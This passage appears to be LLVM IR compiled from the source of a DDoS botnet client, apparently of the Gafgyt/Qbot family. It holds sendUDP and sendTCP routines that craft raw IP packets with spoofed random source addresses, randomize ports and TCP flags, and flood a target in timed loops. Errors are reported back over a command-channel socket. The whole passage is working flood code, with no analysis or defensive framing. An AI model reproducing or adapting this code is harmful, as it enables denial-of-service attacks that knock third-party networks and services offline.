; <label>:56:                                     ; preds = %52
  %57 = call i32 @rand() #2
  %58 = sext i32 %57 to i64
  %59 = urem i64 %58, 78
  %60 = getelementptr inbounds [78 x i8*], [78 x i8*]* %18, i64 0, i64 %59
  %61 = load i8*, i8** %60, align 8
  store i8* %61, i8** %16, align 8
  %62 = load i32, i32* %7, align 4
  %63 = load i8*, i8** %16, align 8
  %64 = load i8*, i8** %16, align 8
  %65 = call i64 @strlen(i8* %64) #10
  %66 = bitcast %union.__CONST_SOCKADDR_ARG* %19 to %struct.sockaddr**
  %67 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  store %struct.sockaddr* %67, %struct.sockaddr** %66, align 8
  %68 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %19, i32 0, i32 0
  %69 = load %struct.sockaddr*, %struct.sockaddr** %68, align 8
  %70 = call i64 @sendto(i32 %62, i8* %63, i64 %65, i32 0, %struct.sockaddr* %69, i32 16)
  %71 = load i32, i32* %7, align 4
  %72 = call i32 @close(i32 %71)
  br label %73

; <label>:73:                                     ; preds = %56, %55
  %74 = load i32, i32* %8, align 4
  %75 = icmp sge i32 %74, 100
  br i1 %75, label %76, label %86

; <label>:76:                                     ; preds = %73
  %77 = call i64 @time(i64* null) #2
  %78 = load i64, i64* %14, align 8
  %79 = load i32, i32* %6, align 4
  %80 = sext i32 %79 to i64
  %81 = add nsw i64 %78, %80
  %82 = icmp sge i64 %77, %81
  br i1 %82, label %83, label %84

; <label>:83:                                     ; preds = %76
  br label %89

; <label>:84:                                     ; preds = %76
  store i32 0, i32* %8, align 4
  br label %85

; <label>:85:                                     ; preds = %84
  br label %86

; <label>:86:                                     ; preds = %85, %73
  %87 = load i32, i32* %8, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %8, align 4
  br label %37

; <label>:89:                                     ; preds = %83
  %90 = load i32, i32* %7, align 4
  %91 = call i32 @close(i32 %90)
  call void @exit(i32 0) #14
  unreachable
                                                  ; No predecessors!
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.udphdr*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load i32, i32* %10, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %43

; <label>:39:                                     ; preds = %8
  %40 = call i32 @rand_cmwc()
  %41 = trunc i32 %40 to i16
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %41, i16* %42, align 2
  br label %48

; <label>:43:                                     ; preds = %8
  %44 = load i32, i32* %10, align 4
  %45 = trunc i32 %44 to i16
  %46 = call zeroext i16 @htons(i16 zeroext %45) #13
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %46, i16* %47, align 2
  br label %48

; <label>:48:                                     ; preds = %43, %39
  %49 = load i8*, i8** %9, align 8
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %51 = call i32 @getHost(i8* %49, %struct.in_addr* %50)
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %48
  br label %311

; <label>:54:                                     ; preds = %48
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %56 = getelementptr inbounds [8 x i8], [8 x i8]* %55, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 8, i32 4, i1 false)
  %57 = load i32, i32* %14, align 4
  store i32 %57, i32* %18, align 4
  %58 = load i32, i32* %12, align 4
  %59 = icmp eq i32 %58, 32
  br i1 %59, label %60, label %128

; <label>:60:                                     ; preds = %54
  %61 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %61, i32* %19, align 4
  %62 = load i32, i32* %19, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %67, label %64

; <label>:64:                                     ; preds = %60
  %65 = load i32, i32* @mainCommSock, align 4
  %66 = call i32 (i32, i8*, ...) @sockprintf(i32 %65, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i32 0, i32 0))
  br label %311

; <label>:67:                                     ; preds = %60
  %68 = load i32, i32* %13, align 4
  %69 = add nsw i32 %68, 1
  %70 = sext i32 %69 to i64
  %71 = call noalias i8* @malloc(i64 %70) #2
  store i8* %71, i8** %20, align 8
  %72 = load i8*, i8** %20, align 8
  %73 = icmp eq i8* %72, null
  br i1 %73, label %74, label %75

; <label>:74:                                     ; preds = %67
  br label %311

; <label>:75:                                     ; preds = %67
  %76 = load i8*, i8** %20, align 8
  %77 = load i32, i32* %13, align 4
  %78 = add nsw i32 %77, 1
  %79 = sext i32 %78 to i64
  call void @llvm.memset.p0i8.i64(i8* %76, i8 0, i64 %79, i32 1, i1 false)
  %80 = load i8*, i8** %20, align 8
  %81 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %80, i32 %81)
  %82 = call i64 @time(i64* null) #2
  %83 = load i32, i32* %11, align 4
  %84 = sext i32 %83 to i64
  %85 = add nsw i64 %82, %84
  %86 = trunc i64 %85 to i32
  store i32 %86, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %87

; <label>:87:                                     ; preds = %124, %120, %113, %75
  %88 = load i32, i32* %19, align 4
  %89 = load i8*, i8** %20, align 8
  %90 = load i32, i32* %13, align 4
  %91 = sext i32 %90 to i64
  %92 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %93 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %93, %struct.sockaddr** %92, align 8
  %94 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %95 = load %struct.sockaddr*, %struct.sockaddr** %94, align 8
  %96 = call i64 @sendto(i32 %88, i8* %89, i64 %91, i32 0, %struct.sockaddr* %95, i32 16)
  %97 = load i32, i32* %22, align 4
  %98 = load i32, i32* %18, align 4
  %99 = icmp eq i32 %97, %98
  br i1 %99, label %100, label %114

; <label>:100:                                    ; preds = %87
  %101 = load i32, i32* %10, align 4
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %107

; <label>:103:                                    ; preds = %100
  %104 = call i32 @rand_cmwc()
  %105 = trunc i32 %104 to i16
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %105, i16* %106, align 2
  br label %107

; <label>:107:                                    ; preds = %103, %100
  %108 = call i64 @time(i64* null) #2
  %109 = load i32, i32* %21, align 4
  %110 = sext i32 %109 to i64
  %111 = icmp sgt i64 %108, %110
  br i1 %111, label %112, label %113

; <label>:112:                                    ; preds = %107
  br label %127

; <label>:113:                                    ; preds = %107
  store i32 0, i32* %22, align 4
  br label %87

; <label>:114:                                    ; preds = %87
  %115 = load i32, i32* %22, align 4
  %116 = add i32 %115, 1
  store i32 %116, i32* %22, align 4
  %117 = load i32, i32* %23, align 4
  %118 = load i32, i32* %15, align 4
  %119 = icmp eq i32 %117, %118
  br i1 %119, label %120, label %124

; <label>:120:                                    ; preds = %114
  %121 = load i32, i32* %16, align 4
  %122 = mul nsw i32 %121, 1000
  %123 = call i32 @usleep(i32 %122)
  store i32 0, i32* %23, align 4
  br label %87

; <label>:124:                                    ; preds = %114
  %125 = load i32, i32* %23, align 4
  %126 = add i32 %125, 1
  store i32 %126, i32* %23, align 4
  br label %87

; <label>:127:                                    ; preds = %112
  br label %311

; <label>:128:                                    ; preds = %54
  %129 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %129, i32* %25, align 4
  %130 = load i32, i32* %25, align 4
  %131 = icmp ne i32 %130, 0
  br i1 %131, label %135, label %132

; <label>:132:                                    ; preds = %128
  %133 = load i32, i32* @mainCommSock, align 4
  %134 = call i32 (i32, i8*, ...) @sockprintf(i32 %133, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i32 0, i32 0))
  br label %311

; <label>:135:                                    ; preds = %128
  store i32 1, i32* %26, align 4
  %136 = load i32, i32* %25, align 4
  %137 = bitcast i32* %26 to i8*
  %138 = call i32 @setsockopt(i32 %136, i32 0, i32 3, i8* %137, i32 4) #2
  %139 = icmp slt i32 %138, 0
  br i1 %139, label %140, label %143

; <label>:140:                                    ; preds = %135
  %141 = load i32, i32* @mainCommSock, align 4
  %142 = call i32 (i32, i8*, ...) @sockprintf(i32 %141, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.404, i32 0, i32 0))
  br label %311

; <label>:143:                                    ; preds = %135
  store i32 50, i32* %27, align 4
  br label %144

; <label>:144:                                    ; preds = %148, %143
  %145 = load i32, i32* %27, align 4
  %146 = add nsw i32 %145, -1
  store i32 %146, i32* %27, align 4
  %147 = icmp ne i32 %145, 0
  br i1 %147, label %148, label %155

; <label>:148:                                    ; preds = %144
  %149 = call i64 @time(i64* null) #2
  %150 = call i32 @rand_cmwc()
  %151 = zext i32 %150 to i64
  %152 = xor i64 %149, %151
  %153 = trunc i64 %152 to i32
  call void @srand(i32 %153) #2
  %154 = call i32 @rand() #2
  call void @init_rand(i32 %154)
  br label %144

; <label>:155:                                    ; preds = %144
  %156 = load i32, i32* %12, align 4
  %157 = icmp eq i32 %156, 0
  br i1 %157, label %158, label %159

; <label>:158:                                    ; preds = %155
  store i32 0, i32* %28, align 4
  br label %165

; <label>:159:                                    ; preds = %155
  %160 = load i32, i32* %12, align 4
  %161 = sub nsw i32 32, %160
  %162 = shl i32 1, %161
  %163 = sub nsw i32 %162, 1
  %164 = xor i32 %163, -1
  store i32 %164, i32* %28, align 4
  br label %165

; <label>:165:                                    ; preds = %159, %158
  %166 = load i32, i32* %13, align 4
  %167 = sext i32 %166 to i64
  %168 = add i64 28, %167
  %169 = call i8* @llvm.stacksave()
  store i8* %169, i8** %29, align 8
  %170 = alloca i8, i64 %168, align 16
  %171 = bitcast i8* %170 to %struct.iphdr*
  store %struct.iphdr* %171, %struct.iphdr** %30, align 8
  %172 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %173 = bitcast %struct.iphdr* %172 to i8*
  %174 = getelementptr i8, i8* %173, i64 20
  %175 = bitcast i8* %174 to %struct.udphdr*
  store %struct.udphdr* %175, %struct.udphdr** %31, align 8
  %176 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %177 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %178 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %177, i32 0, i32 0
  %179 = load i32, i32* %178, align 4
  %180 = load i32, i32* %28, align 4
  %181 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 %180)
  %182 = call i32 @htonl(i32 %181) #13
  %183 = load i32, i32* %13, align 4
  %184 = sext i32 %183 to i64
  %185 = add i64 8, %184
  %186 = trunc i64 %185 to i32
  call void @makeIPPacket(%struct.iphdr* %176, i32 %179, i32 %182, i8 zeroext 17, i32 %186)
  %187 = load i32, i32* %13, align 4
  %188 = sext i32 %187 to i64
  %189 = add i64 8, %188
  %190 = trunc i64 %189 to i16
  %191 = call zeroext i16 @htons(i16 zeroext %190) #13
  %192 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %193 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %192, i32 0, i32 0
  %194 = bitcast %union.anon.3* %193 to %struct.anon.4*
  %195 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %194, i32 0, i32 2
  store i16 %191, i16* %195, align 2
  %196 = call i32 @rand_cmwc()
  %197 = trunc i32 %196 to i16
  %198 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %199 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %198, i32 0, i32 0
  %200 = bitcast %union.anon.3* %199 to %struct.anon.4*
  %201 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %200, i32 0, i32 0
  store i16 %197, i16* %201, align 2
  %202 = load i32, i32* %10, align 4
  %203 = icmp eq i32 %202, 0
  br i1 %203, label %204, label %206

; <label>:204:                                    ; preds = %165
  %205 = call i32 @rand_cmwc()
  br label %211

; <label>:206:                                    ; preds = %165
  %207 = load i32, i32* %10, align 4
  %208 = trunc i32 %207 to i16
  %209 = call zeroext i16 @htons(i16 zeroext %208) #13
  %210 = zext i16 %209 to i32
  br label %211

; <label>:211:                                    ; preds = %206, %204
  %212 = phi i32 [ %205, %204 ], [ %210, %206 ]
  %213 = trunc i32 %212 to i16
  %214 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %215 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon.3* %215 to %struct.anon.4*
  %217 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %216, i32 0, i32 1
  store i16 %213, i16* %217, align 2
  %218 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %219 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %218, i32 0, i32 0
  %220 = bitcast %union.anon.3* %219 to %struct.anon.4*
  %221 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %220, i32 0, i32 3
  store i16 0, i16* %221, align 2
  %222 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %223 = bitcast %struct.udphdr* %222 to i8*
  %224 = getelementptr inbounds i8, i8* %223, i64 8
  %225 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %224, i32 %225)
  %226 = bitcast i8* %170 to i16*
  %227 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %228 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %227, i32 0, i32 2
  %229 = load i16, i16* %228, align 2
  %230 = zext i16 %229 to i32
  %231 = call zeroext i16 @csum(i16* %226, i32 %230)
  %232 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i32 0, i32 7
  store i16 %231, i16* %233, align 2
  %234 = call i64 @time(i64* null) #2
  %235 = load i32, i32* %11, align 4
  %236 = sext i32 %235 to i64
  %237 = add nsw i64 %234, %236
  %238 = trunc i64 %237 to i32
  store i32 %238, i32* %32, align 4
  store i32 0, i32* %33, align 4
  store i32 0, i32* %34, align 4
  br label %239

; <label>:239:                                    ; preds = %306, %302, %295, %211
  br label %240

; <label>:240:                                    ; preds = %239
  %241 = load i32, i32* %25, align 4
  %242 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %243 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %243, %struct.sockaddr** %242, align 8
  %244 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %245 = load %struct.sockaddr*, %struct.sockaddr** %244, align 8
  %246 = call i64 @sendto(i32 %241, i8* %170, i64 %168, i32 0, %struct.sockaddr* %245, i32 16)
  %247 = call i32 @rand_cmwc()
  %248 = trunc i32 %247 to i16
  %249 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %250 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %249, i32 0, i32 0
  %251 = bitcast %union.anon.3* %250 to %struct.anon.4*
  %252 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %251, i32 0, i32 0
  store i16 %248, i16* %252, align 2
  %253 = load i32, i32* %10, align 4
  %254 = icmp eq i32 %253, 0
  br i1 %254, label %255, label %257

; <label>:255:                                    ; preds = %240
  %256 = call i32 @rand_cmwc()
  br label %262

; <label>:257:                                    ; preds = %240
  %258 = load i32, i32* %10, align 4
  %259 = trunc i32 %258 to i16
  %260 = call zeroext i16 @htons(i16 zeroext %259) #13
  %261 = zext i16 %260 to i32
  br label %262

; <label>:262:                                    ; preds = %257, %255
  %263 = phi i32 [ %256, %255 ], [ %261, %257 ]
  %264 = trunc i32 %263 to i16
  %265 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %266 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %265, i32 0, i32 0
  %267 = bitcast %union.anon.3* %266 to %struct.anon.4*
  %268 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %267, i32 0, i32 1
  store i16 %264, i16* %268, align 2
  %269 = call i32 @rand_cmwc()
  %270 = trunc i32 %269 to i16
  %271 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 3
  store i16 %270, i16* %272, align 4
  %273 = load i32, i32* %28, align 4
  %274 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 %273)
  %275 = call i32 @htonl(i32 %274) #13
  %276 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 8
  store i32 %275, i32* %277, align 4
  %278 = bitcast i8* %170 to i16*
  %279 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 2
  %281 = load i16, i16* %280, align 2
  %282 = zext i16 %281 to i32
  %283 = call zeroext i16 @csum(i16* %278, i32 %282)
  %284 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 7
  store i16 %283, i16* %285, align 2
  %286 = load i32, i32* %33, align 4
  %287 = load i32, i32* %18, align 4
  %288 = icmp eq i32 %286, %287
  br i1 %288, label %289, label %296

; <label>:289:                                    ; preds = %262
  %290 = call i64 @time(i64* null) #2
  %291 = load i32, i32* %32, align 4
  %292 = sext i32 %291 to i64
  %293 = icmp sgt i64 %290, %292
  br i1 %293, label %294, label %295

; <label>:294:                                    ; preds = %289
  br label %309

; <label>:295:                                    ; preds = %289
  store i32 0, i32* %33, align 4
  br label %239

; <label>:296:                                    ; preds = %262
  %297 = load i32, i32* %33, align 4
  %298 = add i32 %297, 1
  store i32 %298, i32* %33, align 4
  %299 = load i32, i32* %34, align 4
  %300 = load i32, i32* %15, align 4
  %301 = icmp eq i32 %299, %300
  br i1 %301, label %302, label %306

; <label>:302:                                    ; preds = %296
  %303 = load i32, i32* %16, align 4
  %304 = mul nsw i32 %303, 1000
  %305 = call i32 @usleep(i32 %304)
  store i32 0, i32* %34, align 4
  br label %239

; <label>:306:                                    ; preds = %296
  %307 = load i32, i32* %34, align 4
  %308 = add i32 %307, 1
  store i32 %308, i32* %34, align 4
  br label %239

; <label>:309:                                    ; preds = %294
  %310 = load i8*, i8** %29, align 8
  call void @llvm.stackrestore(i8* %310)
  br label %311

; <label>:311:                                    ; preds = %309, %140, %132, %127, %74, %64, %53
  ret void
}

declare i32 @usleep(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %27 = load i32, i32* %14, align 4
  store i32 %27, i32* %15, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %9, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %7
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %7
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %40
  br label %346

; <label>:46:                                     ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %49, i32* %17, align 4
  %50 = load i32, i32* %17, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %55, label %52

; <label>:52:                                     ; preds = %46
  %53 = load i32, i32* @mainCommSock, align 4
  %54 = call i32 (i32, i8*, ...) @sockprintf(i32 %53, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i32 0, i32 0))
  br label %346

; <label>:55:                                     ; preds = %46
  store i32 1, i32* %18, align 4
  %56 = load i32, i32* %17, align 4
  %57 = bitcast i32* %18 to i8*
  %58 = call i32 @setsockopt(i32 %56, i32 0, i32 3, i8* %57, i32 4) #2
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %63

; <label>:60:                                     ; preds = %55
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.404, i32 0, i32 0))
  br label %346

; <label>:63:                                     ; preds = %55
  %64 = load i32, i32* %11, align 4
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %63
  store i32 0, i32* %19, align 4
  br label %73

; <label>:67:                                     ; preds = %63
  %68 = load i32, i32* %11, align 4
  %69 = sub nsw i32 32, %68
  %70 = shl i32 1, %69
  %71 = sub nsw i32 %70, 1
  %72 = xor i32 %71, -1
  store i32 %72, i32* %19, align 4
  br label %73

; <label>:73:                                     ; preds = %67, %66
  %74 = load i32, i32* %13, align 4
  %75 = sext i32 %74 to i64
  %76 = add i64 40, %75
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %20, align 8
  %78 = alloca i8, i64 %76, align 16
  %79 = bitcast i8* %78 to %struct.iphdr*
  store %struct.iphdr* %79, %struct.iphdr** %21, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %81 = bitcast %struct.iphdr* %80 to i8*
  %82 = getelementptr i8, i8* %81, i64 20
  %83 = bitcast i8* %82 to %struct.tcphdr*
  store %struct.tcphdr* %83, %struct.tcphdr** %22, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %86 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %19, align 4
  %89 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 %88)
  %90 = call i32 @htonl(i32 %89) #13
  %91 = load i32, i32* %13, align 4
  %92 = sext i32 %91 to i64
  %93 = add i64 20, %92
  %94 = trunc i64 %93 to i32
  call void @makeIPPacket(%struct.iphdr* %84, i32 %87, i32 %90, i8 zeroext 6, i32 %94)
  %95 = call i32 @rand_cmwc()
  %96 = trunc i32 %95 to i16
  %97 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon.1* %98 to %struct.anon.2*
  %100 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %99, i32 0, i32 0
  store i16 %96, i16* %100, align 4
  %101 = call i32 @rand_cmwc()
  %102 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon.1* %103 to %struct.anon.2*
  %105 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %104, i32 0, i32 2
  store i32 %101, i32* %105, align 4
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon.1* %107 to %struct.anon.2*
  %109 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %108, i32 0, i32 3
  store i32 0, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon.1* %111 to %struct.anon.2*
  %113 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %112, i32 0, i32 4
  %114 = load i16, i16* %113, align 4
  %115 = and i16 %114, -241
  %116 = or i16 %115, 80
  store i16 %116, i16* %113, align 4
  %117 = load i8*, i8** %12, align 8
  %118 = call i32 @strcmp(i8* %117, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.405, i32 0, i32 0)) #10
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %156, label %120

; <label>:120:                                    ; preds = %73
  %121 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %122 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %121, i32 0, i32 0
  %123 = bitcast %union.anon.1* %122 to %struct.anon.2*
  %124 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %123, i32 0, i32 4
  %125 = load i16, i16* %124, align 4
  %126 = and i16 %125, -513
  %127 = or i16 %126, 512
  store i16 %127, i16* %124, align 4
  %128 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i32 0, i32 0
  %130 = bitcast %union.anon.1* %129 to %struct.anon.2*
  %131 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %130, i32 0, i32 4
  %132 = load i16, i16* %131, align 4
  %133 = and i16 %132, -1025
  %134 = or i16 %133, 1024
  store i16 %134, i16* %131, align 4
  %135 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %136 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %135, i32 0, i32 0
  %137 = bitcast %union.anon.1* %136 to %struct.anon.2*
  %138 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %137, i32 0, i32 4
  %139 = load i16, i16* %138, align 4
  %140 = and i16 %139, -257
  %141 = or i16 %140, 256
  store i16 %141, i16* %138, align 4
  %142 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %142, i32 0, i32 0
  %144 = bitcast %union.anon.1* %143 to %struct.anon.2*
  %145 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %144, i32 0, i32 4
  %146 = load i16, i16* %145, align 4
  %147 = and i16 %146, -4097
  %148 = or i16 %147, 4096
  store i16 %148, i16* %145, align 4
  %149 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i32 0, i32 0
